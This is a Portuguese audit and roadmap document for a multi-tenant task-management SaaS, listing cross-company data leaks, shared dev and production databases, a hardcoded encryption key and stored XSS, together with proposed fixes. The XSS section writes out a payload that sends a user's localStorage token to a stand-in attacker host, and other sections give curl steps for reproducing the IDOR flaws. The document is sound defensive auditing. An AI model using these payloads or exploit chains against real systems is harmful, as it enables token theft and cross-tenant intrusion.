# Workflow (Stack Roads): documento de evolução do produto

Data: 2026-07-19
Base: doze relatórios de auditoria técnica em `c:/tmp/wf-analise/` (índice completo no apêndice, seção 8).
Repositórios: front em `c:/TRABALHO/workflow/work-flow`, API em `c:/TRABALHO/workflow/workflow-api`.

---

## Aviso de confiabilidade (leia antes de agir)

A auditoria que gerou este documento tinha duas fases. A primeira, de leitura e mapeamento, rodou inteira: doze agentes leram os dois repositórios e produziram os relatórios citados aqui. A segunda fase, de **verificação adversarial**, não rodou: o limite de sessão cortou os agentes verificadores antes que qualquer achado fosse confirmado por uma segunda leitura independente.

O que isso significa na prática:

- Todo problema descrito aqui é um **achado não confirmado**. Tem arquivo e linha, foi lido por alguém, mas ninguém checou se a leitura estava certa nem se o caminho de exploração realmente funciona ponta a ponta.
- Os problemas marcados **`confirmar antes de agir`** são os que envolvem risco de dado entre empresas, segurança ou migração destrutiva. Nesses, reproduza o comportamento antes de mexer no código. Cada um deles traz uma linha "como confirmar" com o teste concreto de 5 minutos.
- Onde dois relatórios discordam, o documento diz que há divergência, qual versão parece mais provável e por quê. Não escondi contradição para o texto ficar mais bonito.
- Números agregados (contagem de linhas, de ocorrências, de arquivos) vêm de greps dos agentes. Servem para dar ordem de grandeza, não para relatório de auditoria formal.

Não invente confiança que o processo não produziu. Este documento é um mapa muito bom para decidir onde olhar, e uma base ruim para fazer merge direto em produção sem olhar.

---

## 1. Resumo executivo

### Em que pé o produto está

O Workflow é uma **ferramenta interna madura disfarçada de SaaS**. A profundidade funcional é desproporcional ao tamanho do time: kanban por mês, roadmap anual e mensal, notas TipTap, calendário com OAuth do Google, time tracking com timer único por usuário, canvas colaborativo com Yjs, QR dinâmico com API pública documentada, RAG semântico próprio sobre os dados da empresa, agente de IA com sete ferramentas e streaming por socket, feed, comentários com menção e reação, links públicos read-only, importador de Jira e um pipeline de bug report por vídeo que gera especificação com Claude. São dezenas de módulos na API e 95 arquivos `.vue` no front, 55.260 linhas somando `.vue` e `.ts` (`arch-front.md`, seção 0).

Isso não é um MVP. É um produto com mais superfície do que a maioria das startups seed brasileiras. E ainda assim, hoje, **nenhuma empresa consegue comprar isso**, porque falta a espinha comercial inteira: não existe cobrança, não existe onboarding que funcione, não existe convite por e-mail, não existe recuperação de senha (`produto.md`, seção 1). O que existe de monetização é um card estático na sidebar dizendo "Plano Free / 7 de 20 projetos" com um botão sem handler (`work-flow/src/core/components/shells/CommandShell.vue:100-112`).

Ao mesmo tempo, o produto **já entrega valor de uso comprovado**: o dono toca projetos de clientes reais com ele. Essa é a informação mais importante do diagnóstico. Não é um produto procurando problema. É um problema resolvido procurando um negócio.

### As 3 coisas que mais doem hoje

**1. O isolamento entre empresas está furado em vários pontos, e o desenvolvimento acontece dentro da produção.**
O `CompanyRoleGuard` resolve a empresa pela cadeia `header > params > query > body` (`workflow-api/src/auth/guards/company-role.guard.ts:67-73`), mas vários handlers usam o `:companyId` do path ou da query, que é uma fonte diferente daquela que o guard validou. O resultado descrito é que um usuário autenticado de qualquer empresa lê (e em alguns casos sobrescreve) dados de outra empresa (`arch-api.md`, 2.1; `board-tasks-api.md`, P1; `roadmap-api.md`, P1 a P4). Somando: `GET /company/all` devolve nome e CNPJ de todos os clientes da plataforma para qualquer usuário logado (`workflow-api/src/company/company.controller.ts:39-43`) e `GET /user` devolve nome, e-mail e Discord ID de todos os usuários do SaaS (`workflow-api/src/user/user.controller.ts:55-61`).
E o `.env` local da API aponta para o mesmo projeto Supabase que serve a produção, com `NODE_ENV` comentado (`qualidade.md`, 6.1). Rodar `npm run start:dev` hoje é escrever em produção. Um `deleteMany` mal escrito num experimento apaga dado de cliente, e não há backup versionado nem ambiente onde restaurar (`qualidade.md`, seção 9).

**2. O produto não pode ser vendido, e a única superfície de monetização visível é falsa.**
Quem se cadastra em `/signup` chega ao app sem empresa nenhuma e sem nenhum botão para criar uma: o único ponto de criação está atrás de uma rota com `meta: { requiredRole: 'ADMIN' }` (`work-flow/src/router/index.ts:73`), e quem não tem empresa não tem papel algum. O backend já suporta o caso, com uma exceção explícita de bootstrap (`workflow-api/src/company/company.service.ts:57-70`), mas ninguém construiu a tela (`produto.md`, seção 4). Para adicionar um colega, o admin escolhe numa lista com todos os usuários da plataforma (`work-flow/src/features/companies/components/AddUserModal.vue:47`). E `@sendgrid/mail` está no `package.json` da API sem um único import em `src/`, então não há convite, nem reset de senha, nem digest, nem aviso de prazo.

**3. As telas que você usa todo dia mentem ou perdem o lugar.**
O board agregado conta subtarefas como se fossem tarefas, porque o `getWorkspace` não filtra `parentId: null` como o board mensal filtra (`workflow-api/src/dashboard/dashboard.service.ts:45-50` versus `workflow-api/src/quarter/quarter.service.ts:42-43`). A mesma tarefa com `priorityNumber = 0` aparece como "P0" vermelho crítico numa tela e "Baixíssima" verde na outra (`work-flow/src/features/board/BoardView.vue:41-46` versus `work-flow/src/components/tasks/KanbanBoard.vue:135-145`). Salvar qualquer coisa numa tarefa P0 rebaixa ela para P1 sozinho, por causa de um `Number(x) || 1` (`work-flow/src/features/tasks/TaskDetailsView.vue:64`). E o realtime cobre exatamente um caminho de escrita, o arraste: criar, editar, apagar e anexar não emitem evento nenhum (`workflow-api/src/activity/activity.service.ts:351` é o único emissor de atividade em todo o repo).

Essas três coisas se reforçam. A número 1 impede vender para qualquer empresa que tenha alguém de TI. A número 2 impede vender para qualquer um. A número 3 faz quem já usa desconfiar dos números, que é a forma mais rápida de perder um cliente de ferramenta de gestão.

### A aposta central

**Pare de competir com Trello. Aponte o produto para o cliente do seu cliente.**

Jira, Azure DevOps, Trello e ClickUp são ferramentas de time interno. Todas falham no mesmo ponto para uma agência brasileira: o cliente final nunca entra. Ninguém vai fazer o dono da padaria criar conta no Jira para reportar que o sistema de pedidos travou. O que acontece hoje, em toda agência do país, é áudio de WhatsApp e print no e-mail, traduzidos à mão para uma tarefa por alguém do time.

O Workflow já tem 70% dessa solução construída e não percebeu: URL pública por empresa `/report/:companyId` sem login (`work-flow/src/router/index.ts:47-52`), gravação de tela de até 60 segundos, Gemini extraindo do vídeo, Claude escrevendo uma especificação com passos de reprodução, severidade e prioridade sugerida, virando `Activity` no board do time, e um link `/r/<id>` para o reporter acompanhar (`workflow-api/src/bug-report/bug-report.service.ts:256-336`).

O que falta para isso virar o wedge são três coisas de escopo menor do que o canvas colaborativo que já foi construído e desligado: fechar o loop com o cliente por e-mail (o campo `reporterContact` é gravado em `bug-report.service.ts:132` e nunca usado para responder), um papel de cliente com um portal de leitura, e o canal onde o cliente PME brasileiro realmente está, que é o WhatsApp.

Feito isso, o produto deixa de ser "mais um organizador de tarefas" e passa a ser a camada de relação entre a agência e quem ela atende. Nenhum concorrente grande vai copiar, porque o usuário deles é o time de engenharia, não a agência. E é defensável de verdade: a qualidade da especificação gerada melhora com o histórico da empresa, que já está indexado num RAG local com custo marginal zero de indexação (`@huggingface/transformers`, modelo `Embedding` com 768 dimensões escopado por empresa).

A segunda perna da aposta é dinheiro: `TimeEntry.billable` já existe e o relatório da empresa já separa `billableSec` (`workflow-api/src/time-tracking/time-tracking.service.ts:387-411`). Falta valor-hora e fechamento de mês. Para uma agência, "quanto eu faturo esse mês e de quem" é a pergunta que faz pagar por uma ferramenta. Harvest cobra 12 dólares por pessoa por mês só por isso.

Ordem sugerida em uma frase: **feche o vazamento e separe o ambiente (semana 1), conserte o que mente na tela (semanas 2 a 5), construa o portal do cliente (mês 2), e só então cobre (mês 3).**

---

## 2. O que já é bom (não mexer sem motivo)

O dono acha que "arquiteturalmente pensou coisas ruins no início". Isso é verdade em partes específicas e injusto no geral. Vale registrar o que está certo, porque refatoração que destrói acerto é a mais cara de todas.

### 2.1 A camada HTTP do front é melhor que a média

`work-flow/src/service/api.ts` é a melhor peça de arquitetura do projeto, e o relatório de arquitetura diz isso com todas as letras (`arch-front.md`, seção 5). Tem `apiBaseUrl()` com normalização de esquema e um comentário explicando o incidente real de produção que motivou o código, interceptor de 401 com flag anti-loop e preservação do `redirect`, extração do `x-request-id` que a API devolve, e um `getApiErrorMessage` que trata o caso de `message` ser array (que é o que o `ValidationPipe` do Nest devolve, `workflow-api/src/main.ts:78`).

O problema não é o desenho, é a adesão: só 8 arquivos usam `getApiErrorMessage`, e 49 outros lugares reimplementam `error?.response?.data?.message || 'Erro ao ...'` na mão (`arch-front.md`, P-11). Isso é uma substituição mecânica, não um redesenho.

### 2.2 Tokens de design como fonte única de cor, aplicados em runtime

`work-flow/src/plugins/tokens.ts` grava ~30 variáveis CSS no `documentElement` antes do `createApp`, espelha as variáveis do Vuetify em `:root` como rede de segurança, e liga tema, acento e `color-scheme` num lugar só (`design-system.md`, 1.1). A decisão está certa. O que falha é que 810 declarações de `font-size` em px e 307 de `border-radius` em px ignoram os tokens (`design-system.md`, seção 0). De novo: adesão, não desenho.

### 2.3 O `time-tracking` é o módulo mais bem construído do backend

Índice único parcial garantindo um timer ativo por usuário, auto-stop por cron, retry em `P2002`, agregação por usuário, por atividade e por dia, com `billableSec` separado (`workflow-api/src/time-tracking/time-tracking.service.ts:358-420`; `arch-api.md`, 3.8). É onde a fundação é mais sólida, e não por acaso é onde está o caminho mais curto para receita (seção 5.3 deste documento).

### 2.4 O microserviço de QR é o modelo a generalizar

`CompanyApiToken` com hash sha256, prefixo exibível, revogação, pasta padrão e `lastUsedAt`, autenticação por `Bearer wfqr_...` num guard dedicado (`workflow-api/src/auth/guards/api-token.guard.ts`), e documentação Scalar própria em `/qr-docs`. É a única API pública do produto e está bem feita (`produto.md`, seção 8; `arch-api.md`, 3.7). Quando for construir a API pública de tarefas e os webhooks de saída, copie esse padrão em vez de inventar outro.

### 2.5 A camada de IA é o ativo técnico mais forte

Três coisas se destacam:

- **RAG próprio com custo marginal zero.** Embeddings gerados localmente com `@huggingface/transformers`, indexando ACTIVITY, ROADMAP_MONTH, ROADMAP_ENTRY, EVENT, NOTE, BOARD e BUG_REPORT, escopado por empresa. Concorrente que usa API de embedding paga por indexação; você não (`produto.md`, seção 9).
- **Agente com escopo correto por construção.** O loop de tool use com Claude Sonnet tem sete ferramentas e o comentário no código é explícito e certo: "Todas as tools são escopadas por companyId/userId no HANDLER, o modelo NUNCA recebe companyId como parâmetro" (`workflow-api/src/copilot/agent.service.ts:44-45`). Essa é exatamente a decisão que a maioria erra.
- **Pipeline de bug report com degradação honesta.** Upload público, extração por Gemini, spec por Claude, virada em `Activity`, e fallback funcional se a IA falhar (`workflow-api/src/bug-report/bug-report.service.ts:256-336`).

### 2.6 O padrão de componentização certo já existe no repo, aplicado duas vezes

`features/companies/` foi quebrada em 8 subcomponentes mais um composable local (`VariablesToolbar`, `VariablesList`, `VariableRow`, `VariablesGrid`, `VariableDrawer`, `VariableCreateDialog`, `VariableFieldInput`, `VariableTypeChip`, `useEnvExport`), e `features/dashboard/components/` tem 7 seções (`arch-front.md`, P-13). Ou seja: quando alguém sentou para quebrar uma feature grande, o resultado ficou bom. O `RoadmapView.vue` com 4.563 linhas e o `TaskDetailsView.vue` com 2.293 não são falta de capacidade, são falta de tempo. Existe modelo interno para seguir.

### 2.7 Os guards de rota do front são bem pensados

Expiração de JWT, `requiredRole` por rota, preservação do `redirect`, feature flag do Canvas, tudo comentado (`work-flow/src/router/index.ts:128-141,170-178`; `arch-front.md`, seção 5). O defeito é que existe uma **segunda** fonte de papel para o menu (`workspaceStore.activeRole`), que na prática fica `null` (`shells-nav.md`, P1). O guard está certo; quem está errado é o menu.

### 2.8 O tratamento de erro e o request-id na API

`AllExceptionsFilter` padroniza `{ statusCode, error, message, path, timestamp, requestId }`, preserva o array de mensagens do `ValidationPipe` e nunca vaza stack em 500. O `requestIdMiddleware` usa `AsyncLocalStorage` e o `x-request-id` é exposto no CORS para o front conseguir ler, e o front de fato lê (`work-flow/src/service/api.ts:33-36`). O relatório de qualidade chama isso de "um dos melhores pedaços do repo" (`qualidade.md`, 7.1). Falta só ligar num Sentry para virar suporte de verdade.

### 2.9 Detalhes que mostram cuidado real

- `dueDate` é gravado como date-only às 12:00 UTC para não regredir de dia por fuso (`workflow-api/src/activity/activity.service.ts:69-72`). É o tipo de bug que morde por meses e alguém resolveu direito.
- `composables/useTimeTracking.ts` usa um singleton de ticker com subscription compartilhada, com comentário explicando a razão de performance (`arch-front.md`, seção 5).
- O modo XP é bem-comportado: escopado por shell para não vazar azul em painéis claros, respeita `prefers-reduced-motion`, e desligar volta ao estado anterior (`shells-nav.md`, seção 5).
- Os serviços mais novos do front (`qr`, `time`, `realtime`, `boards`, `share`, `roadmap-monthly`, `collaboration`) já são tipados e exportam interfaces. A direção está certa, falta terminar (`arch-front.md`, P-08 item 5).
- `PATCH /activity/:id` já aceita payload parcial de verdade, com spreads condicionais campo a campo (`workflow-api/src/activity/activity.service.ts:113-129`). Isso significa que a edição direta que o dono quer **não precisa de backend novo** para os campos simples.

---

## 3. Os 10 problemas que mais custam caro hoje

Ordenados por dor do usuário vezes risco vezes esforço, não por facilidade. Os quatro primeiros envolvem risco de dado entre empresas ou segurança e estão marcados. Todos são achados não confirmados, pelos motivos do aviso inicial.

---

### Problema 1. O isolamento entre empresas está furado em pelo menos cinco lugares

**`confirmar antes de agir` · RISCO DE DADO ENTRE EMPRESAS · SEGURANÇA**

**O que acontece.** O `CompanyRoleGuard` resolve qual empresa está sendo acessada por uma cadeia de precedência:

```ts
// workflow-api/src/auth/guards/company-role.guard.ts:67-73
const companyId =
  request.headers['x-company-id'] ||
  request.params?.companyId ||
  request.params?.id ||
  request.query?.companyId ||
  request.body?.companyId;
```

O header vence tudo. Mas vários handlers usam uma fonte diferente daquela que o guard validou. O interceptor do front sempre manda o header (`work-flow/src/service/api.ts:79-81`), então o uso normal funciona. Um atacante autenticado controla os dois valores de forma independente.

**Onde está.** Os relatórios listam a cadeia completa de exploração (`board-tasks-api.md`, P1; `arch-api.md`, 2.1; `roadmap-api.md`, P2 e P3):

| Passo | Endpoint | Arquivo:linha | O que devolve |
|---|---|---|---|
| 1 | `GET /company/all` | `workflow-api/src/company/company.controller.ts:39-43` | id, nome e **CNPJ de todas as empresas da plataforma** |
| 2 | `GET /company/<B>/quarters` | `workflow-api/src/quarter/quarter.controller.ts:29` | ids dos trimestres e meses da empresa B |
| 3 | `GET /quarter/<idDeB>/report` | `workflow-api/src/quarter/quarter.service.ts:207-227` | relatório trimestral de B (`findUnique({ where: { id } })`, sem `companyId`) |
| 4 | `POST /quarter/<idDeB>/report` | mesmo service | **sobrescreve** o relatório de B |
| 5 | `GET /report/completed?companyId=<B>` | `workflow-api/src/report/report.controller.ts:21` | títulos das tarefas concluídas de B e nomes dos responsáveis |
| 6 | `GET /backlog/company/<B>` | `workflow-api/src/backlog/backlog.controller.ts:14-18` | histórico completo de mudanças de B com nome e **e-mail** dos usuários |
| 7 | `GET /dashboard/company/<B>` | `workflow-api/src/dashboard/dashboard.controller.ts:26-48` | métricas de B |
| 8 | `POST/PATCH/DELETE /company/<B>/roadmap/milestones` | `workflow-api/src/quarter/quarter.controller.ts:55-90` | **escreve e apaga** marcos de B |

Há mais três furos independentes:

- `GET /user` devolve nome, e-mail e Discord ID de **todos os usuários do SaaS** para qualquer usuário logado, sem `CompanyRoleGuard` (`workflow-api/src/user/user.controller.ts:55-61`; `workflow-api/src/user/user.service.ts:58-70`). Combinado com o signup público em `POST /user`, qualquer pessoa cria uma conta e faz dump do diretório inteiro.
- `PATCH /user/:id/discord` não compara o `:id` com o `sub` do token (`workflow-api/src/user/user.controller.ts:63-76`), então qualquer usuário sobrescreve o Discord ID de qualquer outro, e o cron menciona esse ID no canal da empresa.
- `GithubConnection` **não tem `companyId` no schema** (`workflow-api/prisma/schema.prisma:529-539`) e o controller só tem `JwtAuthGuard` (`workflow-api/src/github-connection/github-connection.controller.ts:16-51`). Um WORKER da empresa A lista repositórios privados da org GitHub da empresa B usando o PAT dela, ou deleta a conexão e cascateia a exclusão dos `Repository` (`workflow-api/prisma/schema.prisma:488`). O próprio comentário do código assume: "Repos globais (sem company): qualquer user autenticado pode mexer pra simplificar" (`workflow-api/src/repository/repository.service.ts:86-97`).
- `POST /import/jira-xml` escreve em empresas com ids de produção **hardcoded no fonte** (`workflow-api/src/import/import.service.ts:6-10`), com só `JwtAuthGuard` no controller (`workflow-api/src/import/import.controller.ts:117-150`).
- `GET /roadmap/monthly` sem o header devolve `companyId: undefined` no `where` do Prisma, e o Prisma **omite** campos `undefined`, retornando meses, focos, fotos e agenda de todas as empresas da base (`workflow-api/src/roadmap/roadmap.controller.ts:60-70`; `workflow-api/src/roadmap/roadmap.service.ts:61-64`; `roadmap-api.md`, P1).
- `POST /notifications/run-now` não tem role e dispara o cron de Discord de todas as empresas (`workflow-api/src/notifications/notifications.controller.ts:42-48`). O `discordWebhookUrl` chega por body sem DTO, então o `ValidationPipe` com `whitelist: true` não valida nada, e o cron faz `fetch` na URL informada (`workflow-api/src/notifications/notifications.service.ts:343`), o que é SSRF a partir do servidor.

**Por que importa em dinheiro e confiança.** Esse é o bloqueador número um de qualquer venda B2B com alguém de TI do outro lado. Um questionário de segurança básico pergunta "como vocês garantem isolamento entre clientes?", e a resposta honesta hoje é "por disciplina de quem escreveu cada service". Pior: como o produto é multi-empresa por desenho e o dono atende vários clientes no mesmo banco, um incidente aqui não é hipotético, é a exposição de um cliente para outro cliente da mesma agência.

**Como confirmar em 5 minutos.** Com dois usuários de empresas diferentes (ou dois tokens), rode `curl -H "Authorization: Bearer <token de A>" -H "x-company-id: <A>" <API>/backlog/company/<B>`. Se voltar 200 com dados de B, está confirmado. Repita com `GET /quarter/<idDeB>/report`. Se voltar 403 ou 404, o achado está errado e vale revisar o guard antes de mudar qualquer coisa.

**A correção.**
1. Curto prazo, esforço P: o guard já pendura `request.companyId = companyId` depois de validar (`company-role.guard.ts:122`). Criar um decorator `@CompanyId()` que lê **só** isso, e trocar todos os `@Param('companyId')` e `@Query('companyId')` dos handlers. Alternativa mais rígida e mais barata de auditar: o guard **rejeita** quando header e param divergem.
2. Adicionar `companyId` no `where` de `getReport`, `updateReport` e `improveReport` (`quarter.service.ts:207-240`).
3. Remover `GET /company/all` (não serve a ninguém legítimo, já que não existe conceito de super-admin) e `GET /user` (o autocomplete escopado já existe em `GET /user/search`, `user.service.ts:77-94`).
4. `@RequireRole(ADMIN)` mais escopo por empresa em `github-connection`, `import/jira-xml` e `notifications/run-now`.
5. Médio prazo, esforço M: um `TenantContext` resolvido por interceptor mais uma extensão do Prisma Client (`$extends` em `query.$allModels.$allOperations`) que injeta o filtro de tenant automaticamente nas entidades company-scoped. Isso impede que o próximo módulo repita o erro, que é o ponto real. Hoje o filtro correto `month: { quarter: { companyId } }` está repetido literalmente em 17 lugares (`board-tasks-api.md`, 2.4) e nada obriga sua presença.
6. Uma suíte e2e de matriz: usuário de A batendo em todas as rotas com id de B, esperando 403 ou 404. É o investimento com melhor relação custo/risco do repositório inteiro (`arch-api.md`, 3.11).

**Esforço:** P para o patch por endpoint, M para a blindagem estrutural, M para a suíte de testes.

---

### Problema 2. O ambiente de desenvolvimento é a produção

**`confirmar antes de agir` · RISCO DE PERDA DE DADO**

**O que acontece.** O `.env` da API tem duas URLs de banco, e as duas apontam para o **mesmo projeto Supabase** (`plgjjpicmwhrddliyeii`), diferindo apenas em conexão direta versus pooler (`qualidade.md`, 6.1). O `PrismaService` escolhe entre elas por `NODE_ENV`:

```ts
// workflow-api/src/prisma/prisma.service.ts:10-13
const isProduction = process.env.NODE_ENV === 'production';
const databaseUrl = isProduction
  ? process.env.DATABASE_URL_IPV4_POOL_CONNECTION
  : process.env.DATABASE_URL_IPV6_FAST_CONNECTION;
```

E no `.env` local o `NODE_ENV` está comentado nas duas linhas, ou seja, `undefined`. Do lado do front, `VITE_API_URL="https://srhub.up.railway.app"` com a linha do localhost comentada.

**Por que importa.** `npm run dev` no front bate na API de produção. `npm run start:dev` na API escreve no banco de produção. Não existe banco de staging, não existe seed, não existe ambiente descartável. Qualquer teste de migration, qualquer `deleteMany` mal escrito durante o desenvolvimento, qualquer script de limpeza, cai em cima de dado de cliente real.

E não há para onde voltar. Não existe backup versionado nem automatizado do Postgres no repositório. O único lugar que menciona snapshot é `scripts/run-prod-migration.mjs`, que declara `const SNAPSHOT_DIR` e um comentário `// ── 1. BASELINE: contar linhas das tabelas relevantes ──` seguido de nada: **a rede de segurança foi planejada e não implementada** (`qualidade.md`, 5.2). O script também aplica DDL direto no Supabase sem registrar em `_prisma_migrations`, então o Prisma continua achando que a migration não foi aplicada, e ainda usa `ssl: { rejectUnauthorized: false }` (`run-prod-migration.mjs:59`).

Complemento: a senha do usuário `postgres` de produção é uma senha de dicionário com `@` no meio, ao ponto de o script ter um parser de connection string escrito à mão com o comentário "parse manual porque a senha contém '@'" (`qualidade.md`, 5.4). Isso é o superusuário do Postgres de produção.

**Como confirmar em 5 minutos.** Abra o `.env` da API e compare o host das duas `DATABASE_URL_*` com o host que o Railway usa. Se for o mesmo projeto Supabase, está confirmado. Confirme também `node -e "console.log(process.env.NODE_ENV)"` com o `.env` carregado.

**A correção.**
1. Criar um projeto Supabase de desenvolvimento hoje e apontar os `.env` locais para ele. Um seed mínimo com duas empresas e um punhado de tarefas resolve 90% do desenvolvimento diário.
2. Rotacionar a senha do Postgres de produção. De brinde, a rotação mata o hack do parser manual.
3. Fail-fast no boot para `JWT_SECRET`, `ENCRYPTION_KEY` e `QR_PUBLIC_BASE_URL`. Essa última é especialmente perigosa: sem ela, o fallback é `http://localhost:${PORT ?? 5555}` (`workflow-api/src/qr/qr.service.ts:17-22`), ou seja, **todo QR gerado apontaria para localhost**, e QR impresso não se conserta depois.
4. Documentar e testar o restore. Enquanto não houver ambiente separado, não há onde restaurar para validar backup, o que é o mesmo que não ter backup.
5. Aposentar `run-prod-migration.mjs` e colocar `prisma migrate deploy` no pipeline de deploy, que hoje não existe em script nenhum (`qualidade.md`, 5.3).

**Esforço:** P para o ambiente separado e a rotação de senha, P para o fail-fast, M para seed e pipeline.

---

### Problema 3. XSS armazenado na descrição, com token de 7 dias em localStorage e sem CSP

**`confirmar antes de agir` · SEGURANÇA · RISCO DE DADO ENTRE EMPRESAS**

**O que acontece.** O front tem um renderizador sanitizado bem escrito, com `DOMPurify.sanitize` e um comentário explícito na linha 34 dizendo "nunca expor `marked.parse` direto num `v-html`" (`work-flow/src/composables/useMarkdownRenderer.ts:34,43,58`). Quase todos os `v-html` do app usam. **Dois não usam:**

```vue
<!-- work-flow/src/features/tasks/TaskDetailsView.vue:758-762 -->
<div v-if="activityInfo.description" class="desc-body" v-html="activityInfo.description" />

<!-- work-flow/src/features/tasks/TaskDetailsView.vue:1390 -->
<div class="view-value desc-body" v-html="selectedSubtask.description" />
```

O arquivo não importa sanitizador nenhum (grep por `useMarkdownRenderer|DOMPurify|renderHtml` em `TaskDetailsView.vue` volta vazio, `qualidade.md`, 10.1). A `description` é conteúdo escrito por usuário e o backend grava `dto.description` direto, sem sanitização (`workflow-api/src/activity/activity.service.ts:114`).

**Por que importa.** A cadeia está completa e cada elo foi verificado:

1. Qualquer usuário com papel WORKER ou ADMIN em uma empresa escreve `<img src=x onerror="fetch('//evil/?t='+localStorage.token)">` na descrição de uma atividade.
2. O script executa no navegador de **todo colega que abrir a tarefa**.
3. O JWT vive em `localStorage` (`work-flow/src/service/api.ts:67`), tem validade de 7 dias (`workflow-api/src/auth/auth.module.ts:15`), não tem refresh, não tem revogação e não tem logout server-side.
4. O payload do token carrega **todas as empresas do usuário** (`workflow-api/src/auth/auth.service.ts:36-42`). Ou seja, o roubo do token de um colega vaza dados de empresas em que o atacante não participa.
5. Não há `Content-Security-Policy` no Vercel para conter a exfiltração: o `vercel.json` só faz o rewrite de SPA (`qualidade.md`, 8.1).
6. O CORS da API é totalmente aberto, sem `origin` (`workflow-api/src/main.ts:105` e o gateway em `realtime.gateway.ts:34` com `cors: { origin: true }`), o que amplia o alcance.

**Como confirmar em 5 minutos.** Crie uma tarefa de teste com `<img src=x onerror="alert(document.domain)">` na descrição, salve, e abra a tela de detalhe. Se o alert disparar, está confirmado.

**A correção.**
1. Imediato, esforço P: trocar os dois `v-html` por `renderHtml(String(x.description ?? ''))` do composable que já existe. Ou, melhor enquanto a descrição for texto puro, usar `{{ }}` com `white-space: pre-wrap`, o que de brinde resolve o bug de quebras de linha sumirem (`tasks-front.md`, P14: a descrição é escrita num `<v-textarea>` com `\n` e renderizada como HTML sem `pre-wrap`, então critérios de aceitação em lista viram um parágrafo grudado).
2. Sanitizar também no backend na escrita, se a evolução for editor rico (TipTap já está no projeto).
3. Adicionar headers de segurança no `vercel.json` (`Content-Security-Policy`, `X-Frame-Options`, `X-Content-Type-Options`, `Strict-Transport-Security`) e `helmet()` na API.
4. Restringir o CORS a uma allowlist por env. Trabalho de minutos.
5. Médio prazo: JWT curto com refresh token, ou pelo menos `tokenVersion` para permitir revogação. Hoje trocar a senha não invalida sessão nenhuma (`qualidade.md`, 10.3).

**Esforço:** P para o XSS e o CORS, P para os headers, M para o refresh token.

---

### Problema 4. Segredos de cliente protegidos por uma chave que está no repositório

**`confirmar antes de agir` · SEGURANÇA**

**O que acontece.**

```ts
// workflow-api/src/shared/crypto/crypto.service.ts:9
private readonly secretKey = process.env.ENCRYPTION_KEY || '12345678901234567890123456789012';
```

Se `ENCRYPTION_KEY` faltar em produção, a API **sobe normalmente** e criptografa com uma chave publicada no código. Não há validação de env no boot (`arch-api.md`, 2.5; `qualidade.md`, 6.2).

O que passa por esse serviço: as variáveis do tipo `SECRET` das empresas clientes (`workflow-api/src/company-variable/company-variable.service.ts:19,26`) e os Personal Access Tokens do GitHub das empresas (`workflow-api/src/github-connection/github-connection.service.ts:44,101,187,190`; `workflow-api/src/repository/repository.service.ts:121,156`).

E quando a decodificação falha, o serviço devolve o texto cifrado como se fosse o valor:

```ts
// workflow-api/src/shared/crypto/crypto.service.ts:57-62
} catch (err) {
  this.logger.error('Failed to decrypt data', err);
  return encryptedData;
}
```

**Por que importa.** Se a chave mudar (rotação, migração de host, deploy sem a env), a tela de variáveis passa a mostrar o hex do ciphertext como se fosse o segredo, e o serviço do GitHub passa a mandar o ciphertext como se fosse o PAT. Sem erro visível, sem alerta. É corrupção silenciosa disfarçada de resiliência.

Agrava: o `.env.example` documenta `ENCRYPTION_KEY="32-bytes-em-hex-ou-base64"`, mas o código faz `Buffer.from(this.secretKey)` sem encoding, ou seja utf8. Uma chave de 32 bytes em hex tem 64 caracteres, o que faz `crypto.createCipheriv('aes-256-gcm', ...)` lançar `Invalid key length`. A chave local está certa por acidente, com 32 caracteres utf8 (`qualidade.md`, 6.4). Quem provisionar um ambiente novo seguindo a documentação toma 500 na primeira variável `SECRET`.

Há ainda um bug silencioso vizinho: o `enum VariableType` existe no schema (`workflow-api/prisma/schema.prisma:353-358`) e **tem zero usos**. O `type` da variável chega como string livre no DTO (`create-company-variable.dto.ts:18-20`), então um typo em `'SECRET'` faz o valor ser **gravado em texto puro** sem erro nenhum (`arch-api.md`, 2.20).

**Como confirmar em 5 minutos.** Suba a API local com `ENCRYPTION_KEY` removida do `.env` e crie uma variável `SECRET`. Se a API subir e gravar, está confirmado. Depois crie uma variável com `type: "SECRETO"` (typo) e confira no banco se o valor está em claro.

**A correção.** Validar as envs obrigatórias no bootstrap com schema (`zod` ou `class-validator`), remover o fallback, fazer `decrypt` lançar erro tipado, corrigir o `.env.example`, e aplicar `@IsEnum(VariableType)` no DTO. Tudo isso é meio dia de trabalho.

**Esforço:** P.

---

### Problema 5. O modelo de tarefas não tem ano: o produto se degrada sozinho com o tempo de uso

**`confirmar antes de agir` (envolve migração de dado) · DÍVIDA ESTRUTURAL**

**O que acontece.**

```prisma
// workflow-api/prisma/schema.prisma:91-116
model Quarter { label QuarterLabel; companyId String; ... @@unique([companyId, label]) }
model Month   { name String; number Int; quarterId String; @@unique([quarterId, number]) }
```

Não existe `year` em lugar nenhum da hierarquia de tarefas. `CompanyService.create` semeia Q1 a Q4 com 12 meses **uma única vez**, na criação da empresa (`workflow-api/src/company/company.service.ts:76-92`). Uma empresa criada em 2026 tem UM "Janeiro" que será reutilizado em 2027, 2028 e assim por diante.

**Por que importa.**

- As tarefas de janeiro de 2027 caem no mesmo `monthId` das de janeiro de 2026, na mesma coluna do kanban, com a mesma `position`. O board de janeiro mistura anos sem filtro possível, porque não existe dimensão pela qual filtrar.
- O `progress` calculado em `quarter.service.ts:106-108` divide DONE pelo total histórico do mês. Depois de dois anos, "Janeiro 40%" não significa nada.
- Não é possível ver o roadmap de 2025 nem planejar 2027. `GET /company/:companyId/roadmap` sequer aceita `?year=` (`quarter.controller.ts:43-50`).
- Enquanto isso, o roadmap mensal usa uma estrutura **paralela e desconectada que tem ano**: `RoadmapMonth` com `key YYYY-MM`, `year Int` e `month Int` (`workflow-api/prisma/schema.prisma:550-569`). Não existe FK entre `Month` e `RoadmapMonth`, e as convenções nem batem: `Month.number` é 1 a 12, `RoadmapMonth.month` é 0 a 11 (`schema.prisma:109` versus `:555`).

Isso é uma bomba-relógio de retenção: o produto piora sozinho conforme o cliente usa. É o oposto do que se quer em SaaS, onde o dado acumulado é o que segura o cliente.

**Divergência entre relatórios.** `produto.md` (P5) e `board-tasks-api.md` (P2) tratam a falta de ano como a causa estrutural também da queixa do roadmap. `roadmap-api.md` (P5) e `roadmap-front.md` (P-01) tratam a queixa do roadmap como um problema separado, de `select` e de modelo de entrada. **Minha leitura: os dois estão certos em camadas diferentes.** A ausência de ano não é o que impede as datas de entrega de aparecerem hoje (isso é o `select: { status: true }`), mas é o que impede o roadmap de ser navegável por ano depois que as datas aparecerem. Corrigir só um dos dois entrega meia solução.

